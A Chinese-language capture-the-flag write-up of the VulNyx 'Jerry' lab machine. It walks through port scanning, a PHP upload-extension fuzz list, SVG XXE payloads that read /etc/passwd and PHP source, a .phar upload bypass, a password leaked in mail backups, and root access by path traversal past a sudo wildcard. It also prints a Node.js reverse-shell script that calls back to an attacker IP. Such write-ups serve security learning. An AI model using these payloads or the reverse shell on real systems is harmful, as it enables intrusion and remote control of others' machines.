# 信息收集

## tcp开放端口探测
```
# Nmap 7.94SVN scan initiated Sat Jun  1 17:05:08 2024 as: nmap -v --min-rate 10000 -p- -oA tcp_open_port 192.168.43.174
Nmap scan report for 192.168.43.174
Host is up (0.00016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
MAC Address: 00:0C:29:A3:02:D9 (VMware)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jun  1 17:05:11 2024 -- 1 IP address (1 host up) scanned in 3.34 seconds
```

## udp开放端口探测
```
# Nmap 7.94SVN scan initiated Sat Jun  1 17:05:12 2024 as: nmap -sU --min-rate 10000 -p- -oA udp_open_port 192.168.43.174
Warning: 192.168.43.174 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.43.174
Host is up (0.0016s latency).
All 65535 scanned ports on 192.168.43.174 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 00:0C:29:A3:02:D9 (VMware)

# Nmap done at Sat Jun  1 17:06:24 2024 -- 1 IP address (1 host up) scanned in 72.90 seconds


```

## tcp开放端口服务探测
```
Nmap 7.94SVN scan initiated Sat Jun  1 17:06:25 2024 as: nmap -v -sC -sT -sV -O -p22,25,80, -oA open_port_service 192.168.43.174
Nmap scan report for 192.168.43.174
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: vulnyx.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=jerry/organizationName=vulnyx.com/stateOrProvinceName=Spain/countryName=EU
| Issuer: commonName=jerry/organizationName=vulnyx.com/stateOrProvinceName=Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-08T19:46:55
| Not valid after:  2025-03-08T19:46:55
| MD5:   619e:ac26:16fc:4184:0f3e:f3ef:ae6b:a80b
|_SHA-1: 10fa:ffd5:0d71:f25f:9ac4:90d9:b036:e093:7905:0ad3
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: jerry.nyx
MAC Address: 00:0C:29:A3:02:D9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Uptime guess: 1.292 days (since Fri May 31 10:06:03 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  vulnyx.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  1 17:06:34 2024 -- 1 IP address (1 host up) scanned in 9.90 seconds

```
访问80端口网站，点开所有导航页签，查看其提供的所有功能，
在http://192.168.43.174/request/下发现有文件上传功能
![](photo/Pasted%20image%2020240603015034.png)
ctrl+u查看js源码，发现为php站点，尝试对后缀名进行fuzz
[PayloadsAllTheThings/Upload Insecure Files/Extension PHP at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PHP)上的php文件上传后缀字典
```
php
php3
php4
php5
php7
pht
phps
phar
phpt
pgif
phtml
phtm
inc
php%00.gif
php\x00.gif
php%00.png
php\x00.png
php%00.jpg
php\x00.jpg
php%20
php%0d%0a.jpg
php%0a
%E2%80%AEphp.jpg
phtm
phtml
pgif
shtml
htaccess
phar
inc
hphp
ctp

```
![](photo/Pasted%20image%2020240603012615.png)
得到后几个能上传的后缀名，例如phar.
文件上传成功，接下来就是找到文件上传的保存路径，然后主动触发升级到RCE。
但在这一步，使用gobuster,wfuzz,feroxbuster好几个工具结合seclists里的大目录字典都没扫出来，就卡住了，然后看别人的writeup发现图片上传有可能导致XXE注入。
hacktricks.xyz对此攻击手法的介绍
```
### 

SVG - File Upload

Files uploaded by users to certain applications, which are then processed on the server, can exploit vulnerabilities in how XML or XML-containing file formats are handled. Common file formats like office documents (DOCX) and images (SVG) are based on XML.

When users **upload images**, these images are processed or validated server-side. Even for applications expecting formats such as PNG or JPEG, the **server's image processing library might also support SVG images**. SVG, being an XML-based format, can be exploited by attackers to submit malicious SVG images, thereby exposing the server to XXE (XML External Entity) vulnerabilities.

An example of such an exploit is shown below, where a malicious SVG image attempts to read system files:
```
POC参考：
[File upload | J4ckie0x17 (gitbook.io)](https://j4ckie0x17.gitbook.io/notes-pentesting/pentesting-web/file-upload)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=images-functions.php"> ]>
<svg>&xxe;</svg>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

```
文件上传后由upload.php进行处理，因此获取其源码
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload。php"> ]>
<svg>&xxe;</svg>
```
```
<?php
require_once('./images-functions.php');

// uploaded files directory
$target_dir = "./job_request_files/";

// rename before storing
$fileName = date('y-m-d') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

//  blacklist test
if (preg_match('/.+\.ph(p|ps|tml|tm|t)/', $fileName)) {
    echo "Extension not allowed";
    die();
}else{
        echo "File uploaded succesfully";
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
        displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```
可以看到上传文件保存路径代码为
```
$fileName = date('y-m-d') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
```
直接喂给AI:
![](photo/Pasted%20image%2020240603011903.png)
但是浏览器访问http://192.168.43.174/request/job_request_files/24-06-02_1.phar死活报文件不存在，然后使用在线网站重新尝试打印路径信息，发现与AI不一致
![](photo/Pasted%20image%2020240603011946.png)
到浏览器访问成功！然后成功反弹shell！
	ps:所以AI有时候真不可信。


# 权限提升
/opt/backups_mail/目录下发现邮件备份
![](photo/Pasted%20image%2020240603010516.png)
复制到可写目录解压，解压，发现elaine邮件存在密码信息
```
www-data@jerry:/tmp/var/mail$ cat elaine 
From elaine@jerry  Fri Mar  8 10:03:40 2024
Return-Path: <elaine@jerry>
X-Original-To: elaine@vulnyx.com
Delivered-To: elaine@vulnyx.com
Received: by vulnyx.com (Postfix, from userid 1004)
        id 47219A0346; Fri,  8 Mar 2024 10:03:40 -0600 (CST)
Subject: Kramer & Newman Clash at New Years
To: <elaine@vulnyx.com>
User-Agent: mail (GNU Mailutils 3.15)
Date: Fri,  8 Mar 2024 10:03:40 -0600
Message-Id: <20240308160340.47219A0346@vulnyx.com>
From: elaine@jerry

Which millennium are you going to go to, Kramer's or Newman's?

From jerry@jerry  Fri Mar  8 10:03:40 2024
Return-Path: <elaine@jerry>
X-Original-To: jerry@vulnyx.com
Delivered-To: jerry@vulnyx.com
Received: by vulnyx.com (Postfix, from userid 1004)
        id 47219A0346; Fri,  8 Mar 2024 10:03:40 -0600 (CST)
Subject: Vacation weeks at Spain
To: <elaine@vulnyx.com>
User-Agent: mail (GNU Mailutils 3.15)
Date: Fri,  8 Mar 2024 10:03:40 -0600
Message-Id: <20240308160340.47219A0346@vulnyx.com>
From: jerry@jerry


Hi Elaine, 

If I remember correctly you were going on vacation in Spain for a few weeks, right? 
I just wanted to confirm that the password for the gym was 'imelainenotsusie',
I don't want to be there and not be able to pick up the glasses from the gym locker.

Best regards!

```
得到一个密码imelainenotsusie，尝试对有shell环境的用户进行密码喷洒
```
grep sh$ /etc/passwd |awk -F ":" '{print $1}'
```
切换elaine用户成功！

elaine用户sudo -l
```
elaine@jerry:~$ sudo -l
Matching Defaults entries for elaine on jerry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User elaine may run the following commands on jerry:
    (ALL) NOPASSWD: /usr/bin/node /opt/scripts/*.js

```
文件名使用通配符，可以使用相对路径../进行bypass
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "192.168.43.128", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```
sudo /usr/bin/node /opt/scripts/../../../../tmp/shell.js
![](photo/Pasted%20image%2020240603010352.png)